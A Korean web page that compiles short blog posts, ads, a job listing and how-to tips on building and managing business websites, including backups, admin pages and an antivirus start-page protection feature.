몬가 신선하죠?     제작하는 곳에서 구축을 하기때문에 관리업체에서는 구축 과정을 모르겠죠? 그렇기 때문에 트러블이 생기고  유지보수를 하는게 어렵다는 현실입니다.   하지만 십이지처럼 제작과 관리 모두 같이 하는곳은 사후처리가 가능하기 때문에 이용하기에도 불편하지 않고 더 편하게 할수 있다는 장점이 있습니다~  십이지는  유지보수를 1:1로 담당제로 운영하고 있습니다. 개인 매니져역할을 해주신다고 보면 되는데요 번거롭게  여러곳을 거치지않고 다이렉트로 담당자와 의논하고 진행할수 있으며  가격 또한 합리적이랍니다~     또한 고객의 부담을 덜기 위해 , 건별로 혹은 월정액제로 지정할 수 있기때문에  관리가 지속적으로 필요하고 수정사항이 많은경우는 월정액제로 하면 비용적 부담도 덜고 효과적으로 이용할 수 있겠죠?  보통 관리라면 수정만 생각하시죠? 하지만 십이지는 신규페이지 추가 항목도 포함되어 있습니다. 디자인  , 팝업 , 이벤트 , 제품상세설명 ,Flash/jQuery , 인드로 , 배너 , 설문조사 폼메일 , 회원관리 , 상품 , 일정 기타기능 까지 수십가지의영역을 새로 추가할 수 있습니다 대단하죠?  체계적이며 다양하고 여러가지  관리가 가능한 십이지 홈페이지를 보유하고 계신분들이라면 꼭 알아두셔야겠죠? 모든지 꼼꼼하게 알아보기 위해서는  상담은 필수인거 아시쥬? ↗십이지 홈페이지제작센터↖ 신규분들을 위한 5가지 혜택을 제공해드리고 있습니다.자세한건 home page 를 통해서 꼼꼼하게 확인해보시는게 좋겠죠? 홈페이지관리 와 유지보수를 왜 십이지에서 해야하는지 눈으로 확인하시라요~!!​       다국어뉴스부  홈페이지관리담당  채용㈜MJ플렉스는 고용노동부가(2009년 ~ 현재) 선정한 "고용서비스 우수기관" 으로  국내 최고의 방송,  언론,  대기업,  금융, 유통 등의 아웃소싱, 채용대행, 헤드헌팅 등 종합 HR서비스를 제공하고 있습니다. 모집부분 및 지원자격  모집부분- 다국어뉴스부 홈페이지관리 담당 채용 업무내용- 홈페이지 관리 및 외신 이미지 수정 업무- 영문 홈페이지(http://english.yonhapnews.co.kr/) 기사 업데이트 (약간의 영문 해석업무)- 연합뉴스 영문 페이지 SNS 포스팅- 다국어뉴스부 (중문, 일문 등) 홈페이지 이미지 간단 보정자격요건 및 우대사항- 학력 : 무관- 성별 : 무관- 연령 : 무관- 경력 : 무관- 그래픽 툴 (포토샵, 일러스트, 에프터이펙트) 가능자 우대- 장기근무 가능한 자 우대   근무조건  - 회사위치 : 서울시 종로구 수송동 110 연합뉴스 빌딩 - 급 여 : [세전] 월 1,662,790원 + 휴일근무수당 별도- 고용형태 : 파견계약직- 근무시간 : 평일 08:00~16:00 / 13:30~21:00 (격주 교대 근무), 주말 일요일 근무 (격주 교대 근무) 전형방법- 접수마감 : 2017년 12월 26일 (화) 마감 지원방법- 미디어잡 채용공고 참고- http://www.mediajob.co.kr/recruit/recruit.htm?cmd=view&rec_idx=149984   농업인들의 홈페이지 관리, 웹로그 분석 결과 조회 방법 등 홈페이지 운영을 위한 관리자 교육과 매출 증대를 위한 마케팅, 고객관리 기법, 상품홍보를 위한 UCC 제작 등의 교육을 다음과 같이 실시하오니 관심있는 농업인들의 많은 참여 바랍니다.- 다      음 -▷ 일  시 : 2007. 9. 5(수) 09:40∼17:00▶ 장  소 : 전북 농업기술원 정보화교육장▷ 대  상 : 홈페이지 개편 20농가(`07 상반기 개편 농업인),전자상거래 마케팅에 관심있는 농업인▶ 내  용 : - 전자상거래 마케팅, 고객관리              - 웹로그 분석을 위한 관리자 교육              - 홈페이지 수정 방법 (상품정보 수정)              - UCC 제작 방법(판도라 TV)※ 디지털 카메라가 있는 농업인은 지참(UCC 제작 실습에 사용)♧ 기타 궁금한 사항이 있으신 분께서는 연구개발과 연구행정팀(☎ 530-7805)로 문의하여 주시기 바랍니다.  홈페이지제작및관리 정보공개 당연히 알아야 할 홈페이지 백업 이야기!    사라지는 게, 없어지는 게 아쉬워서 조금씩 아껴쓰는 것들 있으세요?저는 열심히 수집한 홈페이지제작및관리 정보들이 그렇더라고요. 그래서 더 많은 분들께 공유하고 싶어요!    이렇게 공유하면 지워지지 않을 테니까요^^    자신이 만든 홈페이지 계정 공간상에 문서 파일들을 올리는 방법은 내 컴퓨터에에 저장된 파일을 웹 서버상에 전송하여 저장하는 것입니다.    파일 업로딩 프로그램인 FTP를 사용하여 프로그램 창 좌측에 있는 폴더에 든 특정 파일들을 더블클릭함으로써 홈페이지의 서버로 전송할 수 있는데요.        모든 사이트에서 FTP 파일 업로딩 전용 프로그램을 지원하는 것은 아니므로 먼저 서비스 가능여부를 알아보는 것이 바람직하답니다.     그리고 홈페이지 제작 완료 후 부족한 부분을 보완해나가다 보면 수정한 부분이 마음에들지 않아 원래대로 되돌아가고 싶은 경우가 있기 때문에 꼭 백업을 해두는 것이 현명해요.        뿐만 아니라 홈페이지 관리 중 컨텐츠나 페이지를 과실로 지웠을 때를 대비해서 백업 작업은필수이며 홈페이지를 확실하게 백업해 두었다면 자유로이 복구가 가능하니 꼭 백업해두세요.     홈페이지 제작 및 관리 시 주의사항, 알아두면 좋은 정보!    홈페이지를 준비할 때 기대하는 스타일 샘플등을 첨부하여 명확히 알려주는 것이 좋은데요. 그래야 제작자와 의뢰인간의 커뮤니케이션이 정확하게 이루어지기 때문에 결과물에 만족할 수 있어요.        그리고 홈페이지를 제작할 경우에는 계약금과 웹페이지의 퀄리티를 비교해보세요.비용에 비해서 과도하게 허술한 경우에는 금액 조절을 하거나 퀄리티를 올려달라고 요청해야 합니다.     홈페이지 제작후에는 관리를 위한 서비스를 인수받아야 하는데요.관리아이디와 비밀번호, 매뉴얼 등을 받고 간단한 사용법을 습득해야 꾸준하게 관리할 수 있어요.또한 홈페이지를 확인할 때에는 절대 지우거나 건들지 말아햐 하는 파일들을 알아 놓아야 해요.중요 파일들을 지우거나 옮겨서 홈페이지가 이상하게 보이거나 열리지 않을 수 있기 때문이죠.        뿐만 아니라 홈페이지 제작 후 업체나 제작자와 하자보수기간을 되도록 상의하여 정해야 하며,홈페이지는 완성 후 많은 에러들이 발생할 확률이 매우 높아 한 달 정도 보수해야 한답니다.        잊고 싶지 않은 내 추억들이 들어있는 컴퓨터 데이터 복구를 하고 싶다면?         검증된 실력과 정직함을 보유한 인젠데이타와 함께 하십시오!    인젠데이타는 컴퓨터를 비롯한 기타 정보저장매체 데이터 복구 전문기업으로서 20년 이상 경력을 갖춘 많은 경험을 보유한 연구진들이 탁월한 데이터 복원 서비스를 제공합니다.      최신 복구 전문장비와 자체 솔루션을 갖추고 있어 타사 대비 높은 복구율도 보장합니다.1:1 인터넷 고객 최적형 무료 상담으로 내 컴퓨터의 문제점도 알 수 있는 기회!     세계 최초 COB 복구기술 개발에 성공한 업계 최고 전문인력의 확실한 서비스, 각종 고객 후기로 입증된 인젠데이타가 직접 보여 드리겠습니다.    홈페이지제작및관리에 관한 정보 유익하셨나요? 집중하고 봐서 눈이 아프시다고요?미국의 한 대학에서 가볍게 눈의 피로를 풀어주는 20운동을 소개했습니다.20분마다 눈동자를 돌리고 20피트 거리를 20초간 보는 거예요! 어때요! 간단하죠?    잠시 밖을 바라보고 눈의 피로를 풀어주세요~! 오늘도 즐거운 하루 되세요!! 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가인터넷이 너무나도 발달한 현대 사회에서는기업이나 회사에 대한 정보를 나타낼 수 있는 홈페이지는 필수이죠!!내 브랜드만의 홈페이지를 제작한 후에 관리가 어려울까봐걱정하시는 분들을 위한 꿀팁을 알려드릴게요!!! :)부푼 설렘을 안고 사업을 시작하거나 회사를 설립한 후에꾸려나가기 위해서는 꼭 필요한 홈페이지 제작,남녀노소 불문하고 언제 어디서든지 쉽게 인터넷을 사용하는 현시점에소비자들에게 내 기업이나 브랜드에 대한 정보를 나타내기 위해서는온라인 마케팅에서 으뜸이 되는 홈페이지 제작의 중요성이 아주 높은데요,처음 제작할 때 제대로만 구축해놓는다면 두고두고 이용할 수 있는 마케팅이랍니다 :)최근에는 스마트폰이 보급되고부터 모바일의 급격한 상승과 더불어PC에서 볼 수 있는 홈페이지는 물론이고 모바일에서도 최적화된사이트에 유입할 수 있도록 홈페이지를 만들고 있는 추세인데요,이러한 홈페이지를 '반응형 웹'이라고 부르고 있으며반응형 웹사이트는 다양한 디스플레이를 가진 어떤 모바일 기기에서도불편함 없이 방문자들이 유입될 수 있게끔 하는 홈페이지 제작 기법이랍니다!회사 홈페이지를 반응형 웹으로 구축하게 되면소비자 입장에서도 하나의 URL로 컴퓨터, 태블릿, 스마트폰, 노트북 등그 어떤 기기를 통해서든지 원활하게 접속할 수 있다는 장점이 있는데요,기업 입장에서는 각각 다른 버전의 사이트를 관리하지 않고하나의 사이트만 관리해도 되다는 편리함까지 갖춘 최신 웹트렌드 기술이에요 :)그렇기 때문에 요즘에는 대부분 반응형 홈페이지로 제작하는 추세랍니다!!그렇지만 위에서도 말했듯이 컴퓨터를 잘 다루지 못하시는 분들은홈페이지를 제작한 후에 어떻게 관리해야 할까 걱정이 되실 텐데요,맞춤형 홈페이지 제작 전문 업체 '웹에이전시 웹스'에서는기업 홈페이지를 효율적으로 제작하고 관리자 페이지를 제공하여클라이언트 스스로도 별도의 추가 비용을 들이지 않고 쉽게 관리할 수 있게 도와드리며관리자 페이지에 대한 사용 방법을 간단하게 교육해드리고 있으니추후에 어떻게 운영해야 할지 고민하지 않아도 되겠죠~~!!!웹에이전시 웹스에서는 홈페이지를 '맞춤형'으로 제작하고 있는데요,타 업체에서 일정한 틀에 내용만 끼워 맞추기 식으로 제작하는 뻔한 사이트가 아닌자체 개발을 통해 훨씬 더 자유롭고 독창적인 표현으로기업의 아이덴티티와 특장점을 표출할 수 있는 맞춤형 사이트를 제작하고 있답니다 :)이 때문에 사이트에 방문한 소비자들은 좋은 인상을 강하게 받을 수 있어서딱 한 번만 접속해도 기업에 대한 이미지가 심어지게 되는마케팅과 브랜딩 효과에 아주 적절한 요소랍니다~!!홈페이지를 제작할 시에는 꼭 '고객'입장에서 생각하는 것이 중요하답니다!그렇기 때문에 웹스에서는 소비자에 눈을 맞춰 홈페이지를 기획하고 설계하며탄탄한 스토리보드를 작성한 후에 실무 제작 작업에 들어가고 있어요 :)이 과정이 있기에 보다 고퀄리티 웹사이트를 구축할 수 있으며과정마다 클라이언트의 컨펌을 받은 후에 진행되니클라이언트가 원하는 딱 알맞은 웹사이트를 보여드릴 수 있는 웹스랍니다!!웹에이전시 웹스는 항시 일대일 무료 상담과 컨설팅을 기반으로클라이언트에게 부담이 가지 않는 합리적인 견적을 책정하여보다 나은 웹 문화를 이끌어가고 있으니언제든지 궁금하신 사항이 있으시면 부담 없이 문의하세요~~ :)안녕하세요~ 다올 고객 지원팀입니다. 오늘의 팁은 홈페이지 고객관리에서 회원 엘셀로 일괄 등록하는 방법을 안내해 드릴까 합니다. 회원들이 개별적으로 가입하는 경우도 있지만 단체로 회원 아이디를 부여하여 많은 수를 등록해야 하는 경우에는 엑셀로 일괄  등록할 수 있는 방법이 있어서 편리하게 사용하시라고 안내드립니다.   우선 관리자페이지를 로그인해 주세요~^^   관리자페이지 로그인 > 상단메뉴 고객관리 > 좌측메뉴 회원엑셀일괄등록 클릭!!! 아주 간단합니다~^^ 해당 페이지에 가면 위의 그림과 같이 엑셀 양식을 다운로드 받고 업로드 할 수 있게 되어 있습니다. 우선 엑셀 등록 할 양식을 다운로드 받으세요~  등록하시 버튼 아래쪽에 좀더 엑셀 파일 작성하는 방법이 안내되어 있으니 참고하시어 바르게 입력해 주셔야 프로그램에서 일괄 등록하실 회원을 읽을 수 있게 됩니다.      회원 일괄 등록 후에 회원들을 좀 더 관리하기위한 그룹관리가 필요하시면 좌측에 회원 그룹관리에 가셔서 회원 그룹을 설정해 줍니다. 기존에 사용하던 회원 그룹이 있으면 해당 그룹을 수정하시거나 새롭게 등록하시어 사용하실 수 있습니다.     회원그룹관리를 클릭 후 등록하시를 누르시면 새로운 회원그룹을 등록하실 수 있는데 이에 따른 회원가입 시 기본 등급 리스트는  좌측 메뉴의 회원 등급설정에서 변경 수정하실 수 있습니다.   참고하시어 홈페이지를 운영하시는데 도움이 되시길 바랍니다.   더 궁금하신 사항은 다올 홈페이지 문의게시판을 통해 남겨주시면 최대한 궁금하신 메뉴얼을 자세하게 안내해 드릴 수 있도록 하겠습니다.      꽃집홈페이지관리  꽃바구니, 화환, 꽃다발 등이 필요할 때 방문하는 곳 꽃집홈페이지!!! 그리고 예전에는 꽆집홈페이지관리를 위해서제작 업체에 연락하여 관리했지만, 요즘에는 관리자 페이지에서 쉽고 간편하게 관리할 수 있어요.  단, 기술적인 문제 등의 원인은 제작업체에 문의하는 것이 좋아요. ​​​​그리고 꽃집홈페이지관리 기능에는 꽃바구니, 화환, 꽃다발 등을 주문할 때 카드가 없을 때, 단말기기 없을 때, 결제수단이 없을 때 간편하게 결제할 수 있는 수기카드결제기능이 있어요.  로즈웹 ASP 프로그램에도 같은 기능이 있는 수기카드결제기능은 엘지유플러스 전자결제서비스와 계약 체결 후 이용 가능한 프로그램이에요.   꽃집홈페이지관리의 수기카드 기능  1. 꽃집홈페이지관리 페이지에서 주문관리 → 수기카드결제 클릭    2. 수기카드결제할 주문 내역 확인하기   ​3. 주문확인 한 후 수기결제 클릭  4. 로그인을 클릭하고 사업자용 공인인증서를 선택 후 비밀번호를 입력해요.  5. 결제하실 카드정보를 입력하신 후 결제를 클릭하시면 결제가 완료돼요이렇게 꽃집홈페이지관리에서 카드 없이 결제한 후 결제 된 것을 확인할 수 있는데요. 이 밖에도 꽃집홈페이지관리 기능에는 여러 가지 기능이 있어쉽고 빠르고 간편하게 관리할 수 있어요. ​​ 꽃집에 필요한 시스템이 있는 곳 뉴런시스템 로즈메이커에서꽃집홈페이지제작과 관리에 대해 상담받아 보세요.     ​     메이크홈즈 나에게 꼭 필요한 홈페이지 제작 및 관리 핵심 정보이제는 완벽하게 알아보자! 홈페이지 백업 핵심 정보   ​옛 속담 중에 ‘산에 가야 범을 잡는다’는 말이 있습니다.어떤 일을 이루기 위해서는 자신이 직접 부딪혀 실행해야 한다는 뜻이죠.홈페이지 제작 및 관리에 대한 정보도 저와 함께 직접 부딪혀 겪어보는 건 어떨까요?혼자 스스로 정보를 찾는 여러분을 위한 정보, 지금 알아봅시다!​   모든 사이트에서 FTP 파일 업로딩 목적 프로그램을 서비스하는 것은 아니기 때문에 우선 서비스 가능 여부를 확인해 보는 것이 좋습니다.​홈페이지 관리 중 컨텐츠나 페이지를 과실로 지웠을 시를 대비해서 백업 작업은 필수입니다.홈페이지를 명확하게 백업해 놓았다면 언제든지 원상복원이 가능합니다.​홈페이지 제작 완료 후 부족한 부분을 바꿔 나가다 보면 수정한 부분이 마음에 들지 않아 처음 상태로 되돌아가고 싶은 경우가 있기 때문에 반드시 백업을 하는 것이 좋습니다.​구축된 홈페이지를 다른 사람에게 보이도록 하기 위해서는 웹 서비스가 가능한 홈페이지의 사이트 서버에 본인의 홈페이지 파일을 등록해야 하는데요, 이때 서버라는 건, 클라이언트의 요청에 응답을 해 주는 프로그램을 일컫습니다.​   이외에도 웹상에 문서를 올릴 때 별도의 FTP 프로그램을 이용하는데, FTP(File Transfer Protocol)이란, 인터넷 서비스 중의 한 종류로 Internet의 일반 파일 업로드 프로토콜 Protocol입니다.​​   ​     모바일 홈페이지 제작, 현명하게 알아보세요!   ​우리나라 스마트폰 전체 이용자 수가 총 4000만 명을 돌파하면서 예약, 주문, 결제 방법이 완벽하게 포함된 휴대폰 전용 사이트 또는 어플리케이션 제작의 중요도가 매우 높아졌습니다.​모바일 홈페이지를 제작할 때 반응형 웹 형태로 만드는 것이 중요한데요.반응형 웹으로 구성된 홈페이지는 각종 태블릿 및 다양한 모바일의 해상도에 알맞은 비율로 제공 가능하므로 가독성이 높다는 장점이 있기 때문입니다.​모바일 사이트 제작 회사를 알아볼 경우에는 회사의 규모도 중요합니다.큰 업체일수록 관리 체계가 잘 잡혀 있기 때문에 제작 후 관리도 꾸준히 이루어질 수 있습니다.​그리고 모바일 홈페이지 제작의 중요성이 증가하면서 많은 분들이 대행업체를 통하여서 제작을 진행하고 있습니다.계약 전 오타에 대한 부분은 되도록이면 대행업체의 책임으로 하여야이후 오타 수정으로 인한 추가 비용이 더해지는 것을 막을 수 있습니다.   최근 대행업체를 통하여 비용을 추가로 청구하지 않으시더라도 무료로 직접 선호하는 모바일 웹페이지를 관리할 수 있는 시스템이 개발되어 많은 소상공인들의 환영을 받고 있습니다.​​   ​우리 가게를 더 쉽게, 더 똑똑하게 홍보하는 방법! 제2의 집인 홈페이지를 제작하세요!비교 불가능한 퀄리티의 로고와 홈페이지를 제작해주는 메이크홈즈가 돕겠습니다!   업체의 상품과 서비스를 철저히 분석해 더 보기 쉽게, 더 흥미가 일도록 제작해드리는 곳!인스타그램 등 SNS를 이용해 다양한 광고 마케팅도 병행하여 홍보효과를 2배로 높여주는 곳!​퀄리티 대비 정직하고 낮은 견적으로 고객님의 마케팅 비용은 줄이고!신속 정확한 일처리 및 지속적인 피드백으로 홈페이지 제작 및 광고 만족도는 높여주고!​지금 메이크홈즈에 문의하셔서 우리 업체를 더 많은 사람들이 볼 수 있게 해 보세요!​저는 어릴 적부터 너무 많은 정보가 담겨있는 백과사전을 제대로 읽지 못했는데요. 그 때문인지 어른이 되면서 내게 정말 필요한 정보만 추려내는 습관이 들었답니다.오늘 알려드린 홈페이지 제작 및 관리 관련 정보가 여러분께도 유용한 정보였길 바라며 인사 올리겠습니다!​​​​   네이버 블로그는 맞지만, 확인불가홈페이지 관리가 너무 어려워(컴퓨터 다루는 실력이 영~~)홈페이지에 있는 모든 결과 자료를 블로그로 옮기고(얼마가 걸릴지 모르겠네요)...홈페이지를 닫으려고 합니다. 핸드폰으로도 쉽게 올리고, 관리 편한 블로그만 하도록 하겠습니다. 참고 바랍니다. 겸사겸사 블로그도 리뉴얼 했습니다. 설계과정, 감리과정, 결과, 그리고 건축주의 피드백까지 담아내도록 해보겠습니다. ​ 네이버 블로그는 맞지만, 확인불가홈페이지관리방법 효율적으로​왠만한 기업치고 홈페이지를 안 가지고 있는 곳은 찾아보기 힘들죠.​그 기업이 어떤 일을 하고 있으며 어떤 목적으로 운영이 되는지, 어떤 상품을 만들거나 판매 하고 있는지를 가장 손쉽게 보여줄 수 있는 루트가 바로 홈페이지인데요.홈페이지는 다양한 목적에 따라서 제작이 되어지고 운영이 되고 있지만 공통적인 부분이 존재하고 있는데요.​공통적인 부분은 바로 방문한 네티즌들이 보기 쉽고 주장하는 바를 제대로 이해할 수 있도록 제작되어야 한다는 점이에요.그리고 홈페이지의 목적 자체가 정보의 전달 및 기업의 성과나 상품의 소개 등 다양한 목적으로 운영이 되기 때문에 지속적으로 관리되고 그때 그때 업로드 및 수정 되어야 하는 것이 중요해요.하지만 대부분의 홈페이지는 홈페이지관리방법이 정말 쉽지 않아요.​홈페이지를 개발하거나 제작한 사람은  쉽게 손을 댈 수 있지만 대부분의 기업의 경우 전담 홈페이지 관리 직원이 없다 보니 전문 지식이 없는 직원이 홈페이지관리방법을 몰라서 헤매는 경우를 쉽게 볼 수 있죠.홈페이지를 제작할 때에는 효율적인 홈페이지관리방법이 적용된 홈페이지를 선택해야 추후 기업관련 정보를 수정할 때에도 곤란을 겪지 않아요.​좋지 않은 홈페이지 제작 업체의 경우는 어렵게 만든 후 수정할 때마다 수정비를 요구하는 경우도 많다 보니 효율적인 방법을 제시해줄 수 있는 홈페이지제작업체를 반드시 만나셔야 해요.​​​전문홈페이지 제작업체인 와이더커뮤니케이션은 고객분들이 쉽게 홈페이지관리방법을 습득하실수 있도록 고객의 입장에서 홈페이지 제작에 임하고 있어요.​​홈페이지 제작시 가장 합리적인 비;용을 통해 최적화된 홈페이지를 구성해드리고 있으며 고객이 수정을 요청할 때 마다 답답하게 기다리시던 관행을 과감히 탈피하여 빠른 피드백을 비롯하여 고객이 직접 홈페이지를 관리하실수 있는 홈페이지관리방법까지 제시를 해드리고 있어요.​​업무를 증가 시키는 홈페이지관리가 아닌 업무를 줄여주는 홈페이지 관리는 와이더커뮤니케이션만이 할수 있습니다.​​와이더커뮤니케이션바로가기http://widercom.co.kr/homepage​​​​​​​​ 네이버 블로그는 맞지만, 확인불가알약 홈페이지 관리 기능으로 내 인터넷 시작페이지를 지키세요!     Q. 이 기능 왜 필요할까요?A. 프로그램을 설치하거나 포털 사이트에 접속하거나 혹은 악성코드에 감염될 때 시작 페이지가 바뀌는 경우가 있는데요. 아무리 바꿔도 변경이 안 되도록 고정이 되는 사례가 있다고 합니다. 알약 공개용에서 제공하는 '홈페이지 관리'기능을 통해 홈페이지 URL을 등록해 두면, 다른 프로그램 등을 통해 시작 페이지가 변경되는 것을 방지할 수 있습니다.  [출처] 내 시작페이지를 보호하는 방법! - 알약 홈페이지 관리 기능을 사용해 보세요! |작성자 알툴즈   기본적으로 인터넷 익스플로러의 경우 시작 페이지는 '도구'>'인터넷 옵션'을 눌러서 바꿀 수 있어요. ('도구' 메뉴바가 안 보일 때는 마우스 우클릭 '메뉴 모음'에 체크해 주세요.) [출처] 내 시작페이지를 보호하는 방법! - 알약 홈페이지 관리 기능을 사용해 보세요! |작성자 알툴즈알약 공개용에서 홈페이지 관리 기능 사용하는 방법!  알약 프로그램에 시작 페이지를 설정 방법은 매우 간단합니다.   1. 먼저 알약을 실행해서 '환경설정'을 누른 후 [출처] 내 시작페이지를 보호하는 방법! - 알약 홈페이지 관리 기능을 사용해 보세요! |작성자 알툴즈2. 기타 설정 > 기타를 누르면 '홈페이지 관리' 메뉴가 보여요. 여기서 홈페이지 URL 란에 원하는 페이지 주소를 입력한 후 '확인'을 누르시면 됩니다. [출처] 내 시작페이지를 보호하는 방법! - 알약 홈페이지 관리 기능을 사용해 보세요! |작성자 알툴즈   혹시 갑자기 알약 실행이 안 되거나 업데이트가 안 되신다면!  알약 전용백신으로 확인해 보세요!  알약 실행이 안 될 때 위 전용백신 검사/치료해 보시고, 해결 안 되면 고객센터로 연락주세요!   ☞ 알약 전용백신 등 대처 방법 안내  http://bit.ly/alyackill     #IT·컴퓨터#알약#알약시작페이지#알약홈페이지관리#시작페이지고정[출처] 내 시작페이지를 보호하는 방법! - 알약 홈페이지 관리 기능을 사용해 보세요! |작성자 알툴즈홈페이지 이름 : 하나로의료재단&미래에셋생명홈페이지 주소 : http://smart-care.miraeasset.com/                                                                              2016/02​​​건강관리 서비스하나로의료재단과 미래에셋생명이 함께하는 건강관리 서비스 홈페이지 구성 프로젝트를 진행하였습니다.미래에셋생명의 특정상품에 가입하신 고객님을 대상으로 질병 예방 및 치료에 도움이 되는 각종 정보와 서비스를 안내하는 프로젝트로 주요 서비스를 복잡하지 않고 쉽게 안내해드리는 것을 목표로 하였습니다.​​ ​​​​​​​​주요 메뉴를 돋보이게​건강상담, 진료예약, 건강검진, 간호사방문 이 4가지 서비스를 주요 메뉴로 독립시켜서 고객님께 혼란 없이 명확함을 강조하였습니다.​​​​ ​​​​​​심플한 컨텐츠 구성​복잡한 설명과 흐름을 최대한 배제하여 단순,명확한 정보를 제공해드릴 수 있는 디자인에 포커스를 맞추었습니다.신청 절차는 이미지를 활용하여 복잡함을 줄였고, 복잡한 컨텐츠들은 표와 도형을 활용하여 쉽게 알아볼 수 있도록 구성하였습니다. ​​  ​​ 안녕하세요 이웃님들  ◟( ˘ ³˘)◞ ♡곧 즐거운 휴일인데, 끝나지 않는 코로나19로 많이들 힘드시죠 ㅜ ㅜ하지만 우리 모두 끝까지 이겨내보도록 해요.  아자아자! ᕙ(•̀‸•́‶) ᕗ   고객 관리 프로그램 쌤트리는 화장품 및 피부관리 프랜차이즈 개발을 지원하는 피에스포유의 대표 CRM 프로그램입니다!  잠깐, CRM이 뭐야? ​​CRM은 Customer Relationship Management의 약자로, 우리말로는 '고객관계관리'라고 하는데요.쉽게 말해 기업이 고객과 관련된 내외부 자료를 분석하고 통합해하여고객 중심 자원을 극대화하고, 이를 토대로 고객 특성에 맞게 마케팅 활동을 하는 과정이에요! ​​CRM의 가장 큰 장점은 고객과의 지속적인 관계를 유지하면서 '한 번 고객은 평생 고객'이 될 수 있는 기회를 만든다는 것인데요.​​CRM은 고객의 정보, 즉 데이터베이스를 기초로 고객을 세부적으로 분류해요.고객 데이터의 세분화를 실시해 신규 고객 획득을 돕고, 우수고객을 유지하는 등고객 가치 증진과 잠재 고객 활성화 같은 사이클을 통해 고객을 적극적으로 관리하고 유도합니다.   바로 그런 CRM 고객 관리 프로그램을 저희 피에스포유가 적극 지원하고 있어요!​쌤트리 기능, 뷰티경영파트너 (주)피에스포유 : 네이버 블로그 (naver.com)  기업이 고객 유치에 가장 먼저 필요한 것은 무엇일까요?바로 홈페이지입니다.소비자에게 홈페이지를 통해 해당 기업의 업무, 홍보, 오시는 길 등 다양하게 제공하기 때문인데요.이는 곧 자신(기업)을 알리는 공간이며 수단이라는 겁니다!!​이렇게 들으니 홈페이지, 정말 중요하죠?​​저희 쌤트리에서는 모두 홈페이지 제작으로 모바일 홈페이지와 검색등록까지,한 번 제작으로 평생 무료 사용을 도와드리고 있는데요~ ​  여기서 잠깐!모두 홈페이지란?modoo란 2015년 4월부터 네이버에서 제공하는 제작부터 관리까지 편리하고 쉽게 이용 가능한 모바일 서비스입니다.피에스포유에서는 전문 맞춤형으로 홈페이지 제작을 해드리고 있으며, 네이버 사이트 등록(검색 등록)까지 도와드립니다.​​​모두 홈페이지 상품이에요!  1. 고급형​메인 페이지 1P와 서브 페이지 6P (게시판, 프로그램 소개, 오시는 길 등)총 7P이며, 제작 기간은 5~7일입니다.​2. 프리미엄메인 페이지 1P와 서브 페이지 10P(게시판, 프로그램 소개, 오시는 길 등),제품 가격표 디자인 1P로총 12P로, 제작 기간은 7~10일입니다. ​3. 맞춤형메인 페이지 1P와 서브 페이지 15P(게시판, 프로그램 소개, 오시는 길 등),이벤트 배너(팝업) 디자인 1P로 총 17P로, 제작 기간은 10~14일입니다.​모든 제작 기간은 시안 컨펌 후로부터의 기간입니다​​​기본 제공 서비스로는 이러한 것들이 나가니참고해 주시면 좋을 것 같아요!  고객님들이 길 찾기 어렵거나, 업체 사진을 보고 싶어서 검색을 해 볼 때 등등! ​이렇게 많은 서비스를 기본으로 제공해드리고 있으니 어려움 없겠죠? ​​​또한 추가 옵션 사항들이 있는데요. 메인 비주얼 이미지 기본 2장 제공 외 추가 이미지 작업일 경우와페이지 추가나 이벤트 배너 추가,혹은 시안 컨펌 후 제작 기간을 지나서 디자인이나 글자 수정을 원하실 경우에는 모두 별도의 비용이 들어갑니다! ​참고 부탁드려요:)​​  오늘은 이렇게 홈페이지 제작과 CRM 그리고쌤트리만의 홈페이지 제작에 대해서도 알려드렸는데요~ ​​어떠셨나요? 홈페이지 제작 .. 당장 하셔야겠죠!?​ 모바일로 들어가면 보이는 쌤트리 홈페이지​혹시 홈페이지 제작에 어려움을 겪고 계시다면 저희 쌤트리를 이용해 주세요:)​무료체험과 상담은 언제나 열려있으니 부담 말고 신청해 주세요 ~ 그럼 다음 포스팅에서 또 만나요  ٩(*˙︶˙*)♡​​​​​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가저는 개인미술을 하는작가입니다 얼마전에홈페이지제작 업체와 계약하고개인 포트폴리오사이트를제작했었는데요제가 이런쪽으론 기술이없다보니 홈페이지관리까지같이 해줄 수 있는 업체가 필요했어요그래서 비교적 저렴한곳으로 정해서 제작했는데엉망이었습니다..미술을 하다보니 그래도나름대로 디자인에 대해선보는 눈이 있었어요제가 까다로운거일수도 있는데아무래도 제가 만든 작품들이제대로 보여지지 않는다면그건 문제가 있는거잖아요?제작비용도 저렴하고기간도 오래 안걸린다길래믿고 맡겼었는데 결과물이영 마음에 들지 않더라구요애초에 홈페이지제작비용은언급도 하지 않았었는데갑자기 말이 바뀌질 않나;  제가 처음에 제작전부터제공했던 작품들 이미지는여기저기 비율이 안맞고분명 처음에 작품의 크기나비율을 임의로 조정하지말아달라 부탁했는데제 의뢰대로 된 부분이전혀 없더군요; 무시당하는 느낌이들어 기분이 무척 나빴는데업체가 하는 소리가홈페이지관리비용을 다달이지불해줘야 사이트를 유지할수 있다고 하더라구요..임대형홈페이지여서 그렇다나 뭐래나..처음에 이런 관리비용에 대한이야기는 없었는데 참 많이당황스럽더군요..  그렇다고해서 홈페이지관리비용이저렴하지도 않았어요 다달이10만원씩 2년동안 약정으로계약을 해야한다는데 제가핸드폰을 구매하는것도 아니고약정은 또 무슨소린지;안그래도 지금 제 이야기를무시하고 사이트 만들기에만급급했던 티가 너무나서 불쾌했는데이런 막무가내식의 태도에참을수가 없더라구요그래서 바로 계약을 해지해버렸죠                    돈 몇푼이 아까운게 아니라이런식으로 일처리를 하는업체에 맡기느니 차라리홈페이지관리비용이 더 들더라도좀 믿을 수 있는 업체에게맡기는게 훨씬 안전하겠다는생각이 들더군요!다행이 지인 사장님께서 일전에홈페이지 리뉴얼때 의뢰했던업체가 있는데 괜찮은 곳이라며소개를 시켜주셨는데요 시기가잘 맞았나요? 마침 무료로마케팅컨설팅도 해준다길래 믿고 맡겼습니다결과는 대만족이었구요  상담받던 중에 알게 된 사실이지만저 같은 경우처럼 제작은 싸게 해놓고이후에 얼토당토않은 홈페이지관리비용으로배를 불리는 악덕업체들이 많다네요하필 제가 거기에 딱 걸리다니 참 운도없지..그래도 지금 업체에게 무료로컨설팅도 받고 또 친절하게 제요구사항도 귀담아 들어주어서정말 만족할만한 제 개인홈페이지가완성되었어요저부터 만족하다보니 자꾸 들어가보고싶고 그렇게 되더라구요 진작에 좀제대로 맡길걸 하는 후회도 들지만지금은 든든한 